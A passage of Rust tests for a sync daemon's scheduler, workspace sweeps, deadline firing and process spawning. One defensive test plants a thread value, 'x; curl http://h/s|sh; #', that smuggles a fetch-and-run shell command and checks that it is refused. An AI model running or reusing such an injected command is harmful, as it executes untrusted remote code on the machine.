        s.on_trigger(Trigger::Wake, t0);
        assert!(s.due(t0), "the two-days-away case must not wait");
    }

    #[test]
    fn a_fresh_scheduler_is_due_immediately_at_startup() {
        // Finding 2 (final review): `Scheduler::new` used to seed `last_pass = now`, leaving a
        // freshly started daemon's very first tick NOT due — `status` then answered
        // `running: false` for up to a full `interval` after start, since no heartbeat exists
        // until a pass actually runs. A daemon must sweep on tick one, unconditionally, with no
        // wake/nudge needed to make it happen.
        let t0 = Instant::now();
        let s = scheduler(t0);
        assert!(
            s.due(t0),
            "a fresh scheduler must already be due at its own start time"
        );
    }

    #[test]
    fn the_interval_fires_a_pass_when_nothing_else_did() {
        let t0 = Instant::now();
        let mut s = scheduler(t0);
        // Consume the cold-start due-ness (finding 2 — see
        // `a_fresh_scheduler_is_due_immediately_at_startup`) so this test measures the safety-net
        // interval counted from a KNOWN last pass, not from construction.
        s.passed(t0);
        assert!(!s.due(t0 + Duration::from_secs(299)));
        assert!(s.due(t0 + Duration::from_secs(300)), "the safety net");
    }

    #[test]
    fn a_completed_pass_clears_the_burst_and_the_wake_flag() {
        let t0 = Instant::now();
        let mut s = scheduler(t0);
        s.on_trigger(Trigger::Wake, t0);
        s.on_trigger(Trigger::Nudge, t0);
        s.passed(t0);
        assert!(!s.due(t0), "nothing is pending straight after a pass");
    }

    #[test]
    fn sleep_is_detected_as_wall_clock_outrunning_the_monotonic_clock() {
        let mono = Instant::now();
        let wall = SystemTime::UNIX_EPOCH + Duration::from_secs(1_000_000);
        let mut d = WakeDetector::new(mono, wall, Duration::from_secs(30));
        // A normal tick: both clocks advance together.
        assert!(!d.tick(mono + Duration::from_secs(1), wall + Duration::from_secs(1)));
        // Sleep: the monotonic clock stalls while the wall clock keeps going.
        assert!(d.tick(
            mono + Duration::from_secs(2),
            wall + Duration::from_secs(3601)
        ));
    }

    #[test]
    fn a_backwards_wall_clock_is_not_mistaken_for_a_wake() {
        // An NTP correction can move the wall clock BACKWARDS. duration_since then returns Err,
        // and treating that as a huge delta would fire a spurious pass on every correction.
        let mono = Instant::now();
        let wall = SystemTime::UNIX_EPOCH + Duration::from_secs(1_000_000);
        let mut d = WakeDetector::new(mono, wall, Duration::from_secs(30));
        assert!(!d.tick(
            mono + Duration::from_secs(1),
            wall - Duration::from_secs(3600)
        ));
        // …and the detector still works normally afterwards.
        assert!(d.tick(
            mono + Duration::from_secs(2),
            wall + Duration::from_secs(3600)
        ));
    }

    // ---- sweep / Pass / Backoff (task 11, `fa65`) ---------------------------------------------

    use crate::sync::{bind_join, save, SyncMeta};
    use nxs_foundation::workspace::WorkspaceConfig;
    use tempfile::TempDir;

    fn workspace() -> (TempDir, Workspace) {
        let tmp = TempDir::new().unwrap();
        let ws = nxs_foundation::workspace::setup(tmp.path(), &WorkspaceConfig::default()).unwrap();
        (tmp, ws)
    }

    /// Plant a session claim in `ws`'s agent-log directory — through chat's own path helper, so a
    /// test cannot pin a layout the writer does not use.
    fn claim_session(ws: &Workspace, session: &str, pid: u32) {
        let root = ws.dir.parent().unwrap();
        let logs = nexus_chat::worker::agent_logs_dir(root);
        std::fs::create_dir_all(&logs).unwrap();
        std::fs::write(logs.join(format!("{session}.pid")), pid.to_string()).unwrap();
    }

    /// **What the machine is held awake FOR** (nxf 6j6v.7q3r), and the second direction first: a
    /// claim left behind by a session that has ended must stop counting, or the assertion is never
    /// given back and the Mac never sleeps again.
    #[test]
    fn the_last_run_ending_is_what_lets_the_machine_sleep_again() {
        let (_a, alpha) = workspace();
        let (_b, beta) = workspace();
        let both = [alpha.clone(), beta.clone()];

        assert!(
            !a_run_is_alive(&both),
            "two fresh workspaces have started nothing"
        );

        // A pid that is certainly gone — checked, not assumed.
        let mut dead = 4_194_303u32;
        while unsafe { libc::kill(dead as libc::pid_t, 0) } == 0 {
            dead -= 1;
        }
        claim_session(&beta, "m-finished", dead);
        assert!(
            !a_run_is_alive(&both),
            "a pid file a finished session left behind must not hold a machine awake forever"
        );

        // …and the first direction: something really running is enough, in ANY attended workspace.
        claim_session(&beta, "m-working", std::process::id());
        assert!(a_run_is_alive(&both));
        assert!(
            a_run_is_alive(std::slice::from_ref(&beta)),
            "and it is beta's session that did it"
        );
        assert!(
            !a_run_is_alive(std::slice::from_ref(&alpha)),
            "not alpha's, which has none"
        );
    }

    #[test]
    fn a_service_attending_nothing_holds_nothing_awake() {
        assert!(!a_run_is_alive(&[]));
    }

    /// Records which workspaces a pass was attempted for, and can be told to fail.
    struct SpyPass {
        calls: std::cell::RefCell<Vec<String>>,
        fail: bool,
        /// What each pass reports having pulled — the signal that decides whether the
        /// project-memory document is regenerated (6j6v.8q88).
        pulled: usize,
    }

    impl SpyPass {
        fn new() -> Self {
            SpyPass {
                calls: std::cell::RefCell::new(Vec::new()),
                fail: false,
                pulled: 0,
            }
        }

        /// A pass that pulls `n` ops — a device that just took in what another one wrote.
        fn pulling(n: usize) -> Self {
            SpyPass {
                pulled: n,
                ..SpyPass::new()
            }
        }

        fn failing() -> Self {
            SpyPass {
                calls: std::cell::RefCell::new(Vec::new()),
                fail: true,
                pulled: 0,
            }
        }
    }

    impl Pass for SpyPass {
        fn run(&self, ws: &Workspace, endpoint: &str) -> Result<PassOutcome> {
            self.calls
                .borrow_mut()
                .push(format!("{}|{endpoint}", ws.dir.display()));
            if self.fail {
                return Err(crate::error::NxfError::io("relay down"));
            }
            Ok(PassOutcome {
                pushed: 0,
                pulled: self.pulled,
                reassigned_prefix: None,
                ..PassOutcome::default()
            })
        }
    }

    #[test]
    fn an_unbound_workspace_is_skipped_without_error() {
        let (_tmp, ws) = workspace(); // registered but never bound
        let spy = SpyPass::new();
        let report = sweep(&[ws], &spy, None);
        assert!(spy.calls.borrow().is_empty());
        assert!(report.errors.is_empty(), "a skip is not an error");
        assert_eq!(report.skipped_unbound.len(), 1);
    }

    #[test]
    fn a_sweep_over_an_empty_workspace_list_still_reports_that_it_ran() {
        // The signal task 12's heartbeat gating depends on (`serve` writes one iff `report.ran`):
        // a due tick with NOTHING registered yet sweeps an empty list — every other bucket stays
        // empty too — but the daemon is still alive and did its job this tick, so `status` must
        // still be able to see that (as opposed to a not-due tick, which never calls `sweep` at
        // all and gets `SweepReport::default()`, `ran: false`, straight from `tick`).
        let spy = SpyPass::new();
        let report = sweep(&[], &spy, None);
        assert!(
            report.ran,
            "an attempted sweep is `ran`, even over zero workspaces"
        );
        assert!(spy.calls.borrow().is_empty());
    }

    #[test]
    fn a_bound_workspace_without_any_resolvable_endpoint_is_skipped_and_reported_once() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let spy = SpyPass::new();
        let report = sweep(&[ws], &spy, None); // no global default either
        assert!(spy.calls.borrow().is_empty());
        assert_eq!(report.skipped_no_endpoint.len(), 1);
    }

    #[test]
    fn a_healthy_workspace_still_syncs_when_a_sibling_is_broken() {
        // One bad workspace must never stop the others — the whole point of a per-workspace
        // sweep rather than one fail-fast pass.
        let (_a, bad) = workspace();
        let (_b, good) = workspace();
        bind_join(&good, "stream-good").unwrap();
        let spy = SpyPass::new();
        let report = sweep(&[bad, good], &spy, Some("https://relay.example"));
        assert_eq!(
            spy.calls.borrow().len(),
            1,
            "only the bound one is attempted"
        );
        assert!(report.errors.is_empty());
    }

    #[test]
    fn the_workspace_override_wins_over_the_global_default_in_the_sweep() {
        let (_tmp, ws) = workspace();
        save(
            &ws,
            &SyncMeta {
                stream_id: "stream-one".into(),
                endpoint: Some("https://per-workspace".into()),
                ..Default::default()
            },
        )
        .unwrap();
        let spy = SpyPass::new();
        sweep(&[ws], &spy, Some("https://global"));
        assert!(spy.calls.borrow()[0].ends_with("|https://per-workspace"));
    }

    #[test]
    fn a_failing_pass_is_recorded_as_an_error_not_a_panic() {
        let (_tmp, ws) = workspace();
        bind_join(&ws, "stream-one").unwrap();
        let spy = SpyPass::failing();
        let report = sweep(&[ws], &spy, Some("https://relay.example"));
        assert_eq!(report.errors.len(), 1);
        assert!(report.synced.is_empty());
    }

    #[test]
    fn a_failing_workspace_backs_off_and_recovers_on_success() {
        let mut b = Backoff::new(Duration::from_secs(300), Duration::from_secs(1800));
        assert_eq!(b.after_failure(), Duration::from_secs(300));
        assert_eq!(b.after_failure(), Duration::from_secs(600));
        assert_eq!(b.after_failure(), Duration::from_secs(1200));
        assert_eq!(b.after_failure(), Duration::from_secs(1800), "capped");
        assert_eq!(b.after_failure(), Duration::from_secs(1800), "stays capped");
        b.after_success();
        assert_eq!(b.after_failure(), Duration::from_secs(300), "reset");
    }

    // ---- stale registry entries (DoD gap #1: no test named it in the brief) -------------------

    #[test]
    fn a_stale_registry_entry_is_skipped_and_a_healthy_sibling_still_syncs() {
        // DoD (n4dn §5.5): a registry entry whose path no longer holds a `.nxs/` — a stale or
        // typo'd entry, or a workspace someone deleted — is skipped WITHOUT error, and a healthy
        // workspace in the same sweep still syncs. Distinct from `skipped_unbound`/
        // `skipped_no_endpoint`: the stale path never becomes a `Workspace` at all, so it never
        // even reaches `sweep`'s own bookkeeping — the skip happens one step earlier, at
        // resolution (`resolve_registered`).
        let missing = TempDir::new().unwrap();
        let (_b, good) = workspace();
        bind_join(&good, "stream-good").unwrap();
        let entries = vec![
            WorkspaceEntry {
                name: "stale".into(),
                path: missing.path().join("gone").to_string_lossy().into_owned(),
            },
            WorkspaceEntry {
                name: "good".into(),
                path: good.dir.parent().unwrap().to_string_lossy().into_owned(),
            },
        ];

        let (resolved, stale) = resolve_registered(&entries);
        assert_eq!(
            stale.len(),
            1,
            "the stale entry is reported, not silently dropped"
        );
        assert_eq!(resolved.len(), 1, "only the healthy workspace resolved");

        let spy = SpyPass::new();
        let report = sweep(&resolved, &spy, Some("https://relay.example"));
        assert_eq!(
            spy.calls.borrow().len(),
            1,
            "the healthy workspace still synced"
        );
        assert!(
            report.errors.is_empty(),
            "a stale sibling must not surface as an error"
        );
    }

    #[test]
    fn a_registered_entry_nested_inside_a_real_workspace_is_skipped_not_resolved_to_the_ancestor() {
        // Finding 5 (final review): the OLD `resolve_registered` called `Workspace::resolve`
        // directly, whose `discover` walks UP the tree — so a stale/deleted registry entry
        // nested inside a genuine ancestor workspace would silently resolve to THAT ancestor and
        // get swept under the dead entry's label, and `discover`'s side effects (legacy-dir
        // migration, minting+persisting a `replica_uuid`) would fire on it once a second. The
        // existing `a_stale_registry_entry_is_skipped_…` test above uses a bare `TempDir` with no
        // workspace ANYWHERE up the tree, so it passes with or without the guard; this one
        // specifically nests the stale entry INSIDE a real workspace, which only checking the
        // entry's OWN `.nxs/replica.toml` (not a directory walk) can tell apart.
        let (_root, ancestor) = workspace(); // a genuine workspace whose root is `_root`
        let nested = ancestor.dir.parent().unwrap().join("gone-subdir");
        std::fs::create_dir_all(&nested).unwrap(); // exists, but holds no `.nxs/` of its own

        let entries = vec![WorkspaceEntry {
            name: "nested".into(),
            path: nested.to_string_lossy().into_owned(),
        }];

        let (resolved, stale) = resolve_registered(&entries);
        assert_eq!(
            stale.len(),
            1,
            "the nested entry is skipped, not silently resolved to its ancestor workspace"
        );
        assert!(
            resolved.is_empty(),
            "without the guard this resolves to the ancestor workspace instead"
        );
    }

    // ---- the project-memory document at the end of a pass (6j6v.8q88) ------------------------
    //
    // The daemon's new responsibility, and the reason `4t9p` had to land first: this writes a
    // VERSIONED file into somebody else's git worktree, in several repositories at once, while
    // they are working in them.

    /// A memory-active workspace holding one memory, with the document already projected from it.
    fn memory_workspace() -> (TempDir, Workspace) {
        use nexus_memory::facade::{self, Classification};
        let tmp = TempDir::new().unwrap();
        let cfg = WorkspaceConfig {
            active_modules: vec!["memory".to_string()],
            ..Default::default()
        };
        let ws = nxs_foundation::workspace::setup(tmp.path(), &cfg).unwrap();
        let mut store = ws.open_memory_store().unwrap();
        facade::remember(
            &mut store,
            "2026-08-04T10:00:00Z",
            "alice",
            Some("auth"),
            "auth uses JWT, not sessions",
            &Classification {
                introduction: Some("auth is JWT, not sessions".into()),
                ..Classification::default()
            },
        )
        .unwrap();
        (tmp, ws)
    }

    fn doc_path(ws: &Workspace) -> PathBuf {
        ws.dir
            .parent()
            .unwrap()
            .join(nexus_memory::project_doc::FILE_NAME)
    }

    #[test]
    fn a_pass_that_pulled_something_projects_the_memory_document() {
        let (_tmp, ws) = memory_workspace();
        bind_join(&ws, "stream-one").unwrap();
        let spy = SpyPass::pulling(3);
        let report = sweep(
            std::slice::from_ref(&ws),
            &spy,
            Some("https://relay.example"),
        );
        assert!(report.doc_errors.is_empty(), "{:?}", report.doc_errors);
        let doc = std::fs::read_to_string(doc_path(&ws)).expect("the document was projected");
        assert!(doc.contains("auth uses JWT, not sessions"), "{doc}");
    }

    #[test]
    fn a_pass_that_pulled_nothing_writes_no_document() {
        // "A pass that pulls nothing writes nothing" — the rule that keeps an idle daemon from
        // touching a worktree at all. Nothing arrived, so nothing can have changed.
        let (_tmp, ws) = memory_workspace();
        bind_join(&ws, "stream-one").unwrap();
        let spy = SpyPass::new(); // pulled: 0
        sweep(
            std::slice::from_ref(&ws),
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            !doc_path(&ws).exists(),
            "an idle pass must not write into the worktree"
        );
    }

    #[test]
    fn a_pass_during_a_rebase_leaves_the_worktree_alone() {
        let (_tmp, ws) = memory_workspace();
        bind_join(&ws, "stream-one").unwrap();
        let root = ws.dir.parent().unwrap().to_path_buf();
        std::fs::create_dir_all(root.join(".git").join("rebase-merge")).unwrap();

        let spy = SpyPass::pulling(3);
        let report = sweep(
            std::slice::from_ref(&ws),
            &spy,
            Some("https://relay.example"),
        );
        assert!(
            report.doc_errors.is_empty(),
            "a held-back write is not an error"
        );
        assert!(
            !doc_path(&ws).exists(),
            "no file is dropped into a worktree mid-rebase"
        );
    }

    #[test]
    fn a_workspace_without_memory_active_is_left_untouched() {
        // Opening memory's store would create its views in a workspace that never asked for the
        // module — a flow-only checkout must come out of a sync pass exactly as it went in.
        let (_tmp, ws) = workspace(); // default config: no active modules
        bind_join(&ws, "stream-one").unwrap();
        let spy = SpyPass::pulling(3);
        let report = sweep(
            std::slice::from_ref(&ws),
            &spy,
            Some("https://relay.example"),
        );
        assert!(report.doc_errors.is_empty());
        assert!(!doc_path(&ws).exists());
    }

    // ---- the clock (6j6v.8see): the service fires the deadlines it finds ------------------------
    //
    // Driven through the REAL `fire_deadlines` with a spy spawner, so what is proven is the path
    // `serve` runs: read the workspace's own book, take what is due, start it in the workspace ROOT
    // with an argv and no shell.

    /// A spawner that records what it was asked to start instead of starting it.
    ///
    /// Most tests here never run a process — the REAL one is driven against real children in
    /// `real_spawn_tests` below, which is the coverage the review of PR #369–#373 found missing
    /// (Test Quality #1).
    struct SpySpawn {
        started: std::cell::RefCell<Vec<(PathBuf, Vec<String>)>>,
        fail: bool,
        /// What `capacity` reports. Unbounded by default so a test that is not about the ceiling
        /// never trips it.
        room: usize,
    }

    impl Default for SpySpawn {
        fn default() -> Self {
            SpySpawn {
                started: std::cell::RefCell::new(Vec::new()),
                fail: false,
                room: usize::MAX,
            }
        }
    }

    impl Spawn for SpySpawn {
        fn capacity(&self) -> usize {
            self.room.saturating_sub(self.started.borrow().len())
        }

        fn spawn(&self, dir: &Path, argv: &[String]) -> Result<()> {
            self.started
                .borrow_mut()
                .push((dir.to_path_buf(), argv.to_vec()));
            if self.fail {
                return Err(NxfError::io("stub: refused to start"));
            }
            Ok(())
        }
    }

    fn arm(ws: &Workspace, due: &str, thread: &str) {
        nxs_service::timers::arm(
            &nxs_service::timers::path_in(&ws.dir),
            due,
            nxs_service::Job::ChatTick {
                thread: thread.to_string(),
            },
        )
        .unwrap();
    }

    #[test]
    fn a_deadline_that_has_come_due_is_started_in_the_workspace_root_with_no_shell() {
        let (_tmp, ws) = workspace();
        arm(&ws, "2026-08-25T17:00:00Z", "m-abc");
        let spy = SpySpawn::default();

        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);

        let started = spy.started.borrow().clone();
        assert_eq!(started.len(), 1, "{started:?}");
        assert_eq!(
            started[0].0,
            ws.dir.parent().unwrap(),
            "a tick resolves its workspace from the working directory, so it runs in the ROOT"
        );
        assert_eq!(started[0].1, vec!["chat", "tick", "--thread", "m-abc"]);
        assert!(
            !started[0].1.iter().any(|a| a.contains("sh") && a.len() < 4),
            "no shell is ever involved: {started:?}"
        );
        assert_eq!(report.fired.len(), 1);
        assert!(report.errors.is_empty(), "{report:?}");
    }

    #[test]
    fn a_window_that_has_not_run_out_yet_is_left_alone() {
        let (_tmp, ws) = workspace();
        arm(&ws, "2026-08-25T19:00:00Z", "m-abc");
        let spy = SpySpawn::default();
        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);
        assert!(spy.started.borrow().is_empty());
        assert_eq!(report, ClockReport::default());
    }

    #[test]
    fn a_fired_deadline_is_not_fired_again_on_the_next_tick() {
        let (_tmp, ws) = workspace();
        arm(&ws, "2026-08-25T17:00:00Z", "m-abc");
        let spy = SpySpawn::default();
        fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);
        fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:01Z", &spy);
        assert_eq!(
            spy.started.borrow().len(),
            1,
            "the book no longer names it, so a service that ticks every second cannot re-fire it"
        );
    }

    #[test]
    fn a_workspace_with_no_book_at_all_is_silent() {
        let (_tmp, ws) = workspace();
        let spy = SpySpawn::default();
        assert_eq!(
            fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy),
            ClockReport::default()
        );
    }

    #[test]
    fn a_deadline_in_one_workspace_does_not_stop_the_next_one_from_firing() {
        let (_a, ws_a) = workspace();
        let (_b, ws_b) = workspace();
        // A book that cannot be parsed at all — the first workspace's whole clock is broken.
        std::fs::write(nxs_service::timers::path_in(&ws_a.dir), "{not json").unwrap();
        arm(&ws_b, "2026-08-25T17:00:00Z", "m-b");

        let spy = SpySpawn::default();
        let report = fire_deadlines(&[ws_a.clone(), ws_b.clone()], "2026-08-25T18:00:00Z", &spy);

        assert_eq!(
            report.errors.len(),
            1,
            "the broken one is reported: {report:?}"
        );
        assert_eq!(
            spy.started.borrow().len(),
            1,
            "and its healthy sibling still fires — one service, many workspaces"
        );
    }

    #[test]
    fn a_deadline_that_cannot_be_started_is_reported_rather_than_swallowed() {
        let (_tmp, ws) = workspace();
        arm(&ws, "2026-08-25T17:00:00Z", "m-abc");
        let spy = SpySpawn {
            fail: true,
            ..SpySpawn::default()
        };
        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);
        assert!(report.fired.is_empty());
        assert_eq!(report.errors.len(), 1);
        assert!(
            report.errors[0].1.contains("m-abc"),
            "the report names the board whose window was missed: {report:?}"
        );
    }

    #[test]
    fn a_burst_beyond_this_ticks_capacity_is_deferred_rather_than_flooding_or_lost() {
        // The case three reviewers reached independently, and it is not only the crafted one: a
        // laptop closed over a weekend brings every armed window due at the same instant.
        let (_tmp, ws) = workspace();
        for i in 0..20 {
            arm(&ws, "2026-08-25T17:00:00Z", &format!("m-{i:03}"));
        }
        let spy = SpySpawn {
            room: 3,
            ..SpySpawn::default()
        };

        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);

        assert_eq!(
            spy.started.borrow().len(),
            3,
            "only what there was room for"
        );
        assert_eq!(report.fired.len(), 3);
        assert_eq!(
            report.deferred,
            vec![(ws.dir.display().to_string(), 17)],
            "and the rest is REPORTED, not silently dropped: {report:?}"
        );
        assert_eq!(
            nxs_service::timers::read_from(&nxs_service::timers::path_in(&ws.dir))
                .unwrap()
                .len(),
            17,
            "the deferred deadlines are still armed — a bounded tick must not cost a window"
        );
    }

    #[test]
    fn a_deferred_burst_drains_over_the_following_ticks() {
        let (_tmp, ws) = workspace();
        for i in 0..7 {
            arm(&ws, "2026-08-25T17:00:00Z", &format!("m-{i:03}"));
        }
        let mut fired = 0;
        for _ in 0..4 {
            let spy = SpySpawn {
                room: 3,
                ..SpySpawn::default()
            };
            fired += fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy)
                .fired
                .len();
        }
        assert_eq!(fired, 7, "every window fires, just not all at once");
        assert!(
            nxs_service::timers::read_from(&nxs_service::timers::path_in(&ws.dir))
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn one_workspaces_burst_does_not_let_the_next_one_overrun_the_capacity() {
        let (_a, ws_a) = workspace();
        let (_b, ws_b) = workspace();
        for i in 0..10 {
            arm(&ws_a, "2026-08-25T17:00:00Z", &format!("m-a{i:03}"));
        }
        arm(&ws_b, "2026-08-25T17:00:00Z", "m-b");
        let spy = SpySpawn {
            room: 4,
            ..SpySpawn::default()
        };

        fire_deadlines(&[ws_a.clone(), ws_b.clone()], "2026-08-25T18:00:00Z", &spy);

        assert_eq!(
            spy.started.borrow().len(),
            4,
            "the ceiling is for the TICK, not for each workspace in it"
        );
        assert_eq!(
            nxs_service::timers::read_from(&nxs_service::timers::path_in(&ws_b.dir))
                .unwrap()
                .len(),
            1,
            "and the workspace that got nothing this tick keeps its window for the next one"
        );
    }

    #[test]
    fn a_hand_written_book_naming_an_id_this_build_will_not_run_starts_nothing() {
        // The gate `arm` applies, applied to what is READ — a book written by hand never goes
        // through `arm` at all, which is exactly the path it was built to defend.
        let (_tmp, ws) = workspace();
        std::fs::write(
            nxs_service::timers::path_in(&ws.dir),
            r#"{"deadline":[{"due":"2026-08-25T17:00:00Z","job":"chat_tick",
               "thread":"x; curl http://h/s|sh; #"}]}"#,
        )
        .unwrap();
        let spy = SpySpawn::default();

        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);

        assert!(
            spy.started.borrow().is_empty(),
            "nothing is started for an id this build refuses: {:?}",
            spy.started.borrow()
        );
        assert_eq!(report.skipped, vec![(ws.dir.display().to_string(), 1)]);
    }

    #[test]
    fn a_book_past_the_size_ceiling_is_refused_and_starts_nothing() {
        let (_tmp, ws) = workspace();
        let mut huge = String::from(r#"{"deadline":["#);
        // Well past the ceiling, and every entry due — so a build without the ceiling would try to
        // start all of them.
        for i in 0..30_000 {
            if i > 0 {
                huge.push(',');
            }
            huge.push_str(&format!(
                r#"{{"due":"2026-08-25T17:00:00Z","job":"chat_tick","thread":"m-{i:09}"}}"#
            ));
        }
        huge.push_str("]}");
        std::fs::write(nxs_service::timers::path_in(&ws.dir), &huge).unwrap();

        let spy = SpySpawn::default();
        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);

        assert!(spy.started.borrow().is_empty());
        assert_eq!(report.errors.len(), 1, "{report:?}");
        assert!(
            report.errors[0].1.contains("larger than"),
            "the refusal says what is wrong: {report:?}"
        );
    }

    #[test]
    fn a_due_job_this_build_cannot_run_is_counted_and_left_for_a_build_that_can() {
        let (_tmp, ws) = workspace();
        std::fs::write(
            nxs_service::timers::path_in(&ws.dir),
            r#"{"deadline":[{"due":"2026-08-25T17:00:00Z","job":"from_a_newer_binary"}]}"#,
        )
        .unwrap();
        let spy = SpySpawn::default();
        let report = fire_deadlines(std::slice::from_ref(&ws), "2026-08-25T18:00:00Z", &spy);
        assert!(spy.started.borrow().is_empty());
        assert_eq!(report.skipped.len(), 1);
        assert_eq!(report.skipped[0].1, 1);
    }

    // ---- RealSpawn against REAL processes (review of PR #369-#373, Test Quality #1) -------------
    //
    // Everything above drives `fire_deadlines` through `SpySpawn`, which is right for the sweep's
    // bookkeeping and blind to the one thing `RealSpawn` actually owns: what happens to a child
    // handle. These tests run real, trivial children — never `nxs` itself, which would have the test
    // harness re-executing itself — and assert the handle bookkeeping directly.

    /// `/bin/sleep`, present on every unix this ships to. Skipped elsewhere rather than faked: the
    /// point of these tests is a REAL process.
    #[cfg(unix)]
    const TRIVIAL: &str = "/bin/sleep";

    #[cfg(unix)]
    #[test]
    fn a_finished_child_is_reaped_and_one_still_running_is_kept() {
        let spawn = RealSpawn::running(TRIVIAL);
        let dir = std::env::temp_dir();
        spawn
            .spawn(&dir, &["0".to_string()])
            .expect("a child starts");
        spawn
            .spawn(&dir, &["30".to_string()])
            .expect("a second child starts");
        assert_eq!(spawn.outstanding(), 2, "both handles are held at first");

        // The first child exits immediately; `reap` is non-blocking, so poll it rather than sleeping
        // a fixed amount and hoping. Bounded so a wedged machine fails the test instead of hanging.
        let mut left = 2;
        for _ in 0..200 {
            spawn.reap();
            left = spawn.outstanding();
            if left == 1 {
                break;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        assert_eq!(
            left, 1,
            "the finished child's handle is dropped and the running one's is not"
        );

        spawn.kill_outstanding();
        spawn.reap();
        assert_eq!(spawn.outstanding(), 0, "and the test leaves nothing behind");
    }

    #[cfg(unix)]
    #[test]
    fn capacity_falls_as_children_start_and_returns_when_they_are_reaped() {
        let spawn = RealSpawn::running(TRIVIAL);
        let dir = std::env::temp_dir();
        assert_eq!(spawn.capacity(), MAX_OUTSTANDING_JOBS);

        for _ in 0..MAX_OUTSTANDING_JOBS {
            spawn.spawn(&dir, &["30".to_string()]).unwrap();
        }
        assert_eq!(spawn.capacity(), 0, "the ceiling is reached");

        // The backstop inside `spawn` itself: `fire_deadlines` asks `capacity` first and never gets
        // here, but a ceiling that only holds when the caller remembers it is not a ceiling.
        let err = spawn
            .spawn(&dir, &["30".to_string()])
            .expect_err("one past the ceiling is refused");
        assert!(err.msg.contains("refusing to start another"), "{}", err.msg);

        spawn.kill_outstanding();
        spawn.reap();
        assert_eq!(
            spawn.capacity(),
            MAX_OUTSTANDING_JOBS,
            "and the room comes back once they are collected"
        );
    }

    /// **A job started by a named service belongs to that service** (nxf 6j6v.gd9p).
    ///
    /// The spawner forces `argv[0]` to `nxs` so the job's verb routes — and that is exactly what
    /// throws away the name the parent read its own instance out of. A child that fell back to the
    /// default would consult the PRODUCTION registry, heartbeat and deadline book while its parent
    /// used `~/.nexusflow-dev`: half-isolated, which is the failure that looks correct.
    #[cfg(unix)]
    #[test]
    fn a_child_is_told_which_instance_started_it_because_argv0_can_no_longer_say() {
        let tmp = TempDir::new().unwrap();
        let out = tmp.path().join("inherited");
        let dev = nxs_service::Instance::named("nexus-flow-dev").unwrap();
        let spawn = RealSpawn::running_as("/bin/sh", &dev);
        // **Written to a temp and RENAMED**, not redirected straight at `out`. A `>` redirect
        // creates the file before `printf` fills it, so a watcher waiting on existence alone reads
        // an empty one — which this test did, and it went red once in a full debug run after
        // passing repeatedly. `mv` within one directory is atomic, so `out` appearing IS `out`
        // being complete, and the wait below cannot observe a half-written answer.
        spawn
            .spawn(
                tmp.path(),
                &[
                    "-c".to_string(),
                    format!(
                        "printf '%s' \"${{{}:-UNSET}}\" > {tmpf} && mv {tmpf} {final}",
                        nxs_service::instance::INSTANCE_ENV,
                        tmpf = tmp.path().join("inherited.part").display(),
                        final = out.display()
                    ),
                ],
            )
            .expect("the shell starts");
        // The child is not waited on by design, so wait for its own artefact.
        let mut arrived = false;
        for _ in 0..500 {
            if out.exists() {
                arrived = true;
                break;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        spawn.kill_outstanding();
        // A timeout is its own failure, said in its own words: without this the assert below
        // compares against an empty string and reports "the child saw the wrong instance" for a
        // child that never finished writing.
        assert!(
            arrived,
            "the child never produced its answer — this says nothing about which instance it saw"
        );
        assert_eq!(
            std::fs::read_to_string(&out).unwrap_or_default(),
            "nexus-flow-dev",
            "a job started by the dev service must not look at the production home"
        );
    }

    // `#[cfg(unix)]` RESTORED (review of PR #395, Code Quality #1): inserting the test above stole
    // this one's attribute, because the new block was written before the `#[test]` line rather than
    // before the whole item. `RealSpawn::spawn` is unix-gated at `arg0`, so a non-unix build was
    // compiling a test of a path it does not have.
    #[cfg(unix)]
    #[test]
    fn a_program_that_does_not_exist_is_a_reported_failure_and_holds_no_handle() {
        let spawn = RealSpawn::running("/nonexistent/nothing-here");
        let err = spawn
            .spawn(&std::env::temp_dir(), &[])
            .expect_err("a program that is not there cannot start");
        assert_eq!(err.kind.as_str(), "io");
        assert_eq!(
            spawn.outstanding(),
            0,
            "a failed start must not consume capacity for the rest of the run"
        );
    }

    // ---- tick / DaemonState (review round 1, `fa65`): the loop's per-tick orchestration -------
    //
    // These exercise the REAL `tick`/`DaemonState` the loop runs — not a hand-rolled stand-in —
    // clock-injected exactly like `Scheduler`/`WakeDetector`'s own tests, so none of them sleep
    // or spawn a process.

    /// A `DaemonState` whose `Scheduler` is unconditionally due (`interval = 0` ⇒
    /// `now.duration_since(last_pass) >= 0` is always true once `passed` has run), so a test can
    /// isolate backoff/warn-once behaviour across ticks without also having to drive a real
    /// wake or nudge to make the scheduler fire.
    fn always_due_state(t0: Instant, wall0: SystemTime) -> DaemonState {
        DaemonState::new(
            t0,
            wall0,
            Duration::ZERO,
            Duration::from_secs(2),
            Duration::from_secs(10),
            Duration::from_secs(30),
        )
    }

    /// A `DaemonState` with the spec's real tuning (300s interval, 2s debounce, 10s max_wait,
    /// 30s wake threshold) — for tests that want the debounce/interval machinery itself in play.
    fn realistic_state(t0: Instant, wall0: SystemTime) -> DaemonState {
        DaemonState::new(
            t0,
            wall0,
            Duration::from_secs(300),
            Duration::from_secs(2),
            Duration::from_secs(10),
            Duration::from_secs(30),
        )
    }

    fn set_mtime(path: &std::path::Path, t: SystemTime) {
        let f = std::fs::File::options().write(true).open(path).unwrap();
        f.set_modified(t).unwrap();
    }

    #[test]
    fn a_missing_endpoint_is_warned_on_the_first_tick_and_silent_on_the_next() {
        // Replaces a prior version of this test that asserted `HashSet::insert` semantics on a
        // `HashSet` built INSIDE the test — it could never fail for the reason the "logged once
        // per daemon run" constraint exists, because it never called any production code. This
